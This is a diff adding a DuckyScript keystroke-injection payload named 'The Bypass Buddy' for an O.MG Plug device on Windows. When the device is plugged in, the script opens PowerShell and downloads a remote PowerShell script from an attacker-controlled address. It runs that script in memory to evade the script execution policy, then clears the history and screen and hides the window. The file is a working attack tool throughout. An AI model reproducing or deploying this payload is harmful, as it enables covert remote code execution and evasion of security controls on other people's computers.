@@ -1,0 +1,31 @@
+REM_BLOCK
+    The Bypass Buddy
+    by salt-or-ester - salt-or-ester@protonmail.com
+    Tested on: O.MG Plug Elite, Windows 11
+    Will likely work on other devices and Windows flavors
+    
+    The Bypass Buddy implements a method to evade Windows script execution 
+    policy protections.
+    
+    The approach involves downloading a Powershell script into memory (not disk), 
+    and running it on-the-fly. 
+    
+    This can be accomplished without administrative rights.
+END_REM
+
+REM Payload to download and run in memory
+DEFINE #PAYLOAD_URL "http://10.10.10.10/payload.ps1"
+
+FUNCTION EVADE_SCRIPT_EXECUTION_POLICY()
+GUI r
+DELAY 2000 REM Let GUI load
+STRINGLN powershell
+DELAY 1000 REM Let Powershell window open
+STRINGLN Start-Job -ScriptBlock { try { $response = Invoke-WebRequest -Uri #PAYLOAD_URL -ErrorAction Stop; $scriptContent = [System.Text.Encoding]::UTF8.GetString($response.Content); cd ~; Invoke-Expression $scriptContent } catch { Write-Error "Failed to download or execute script: $_" } }
+STRINGLN Clear-History
+STRINGLN clear
+GUI DOWNARROW
+END_FUNCTION
+
+DELAY 3000 REM Wait for device to be "ready"
+EVADE_SCRIPT_EXECUTION_POLICY()
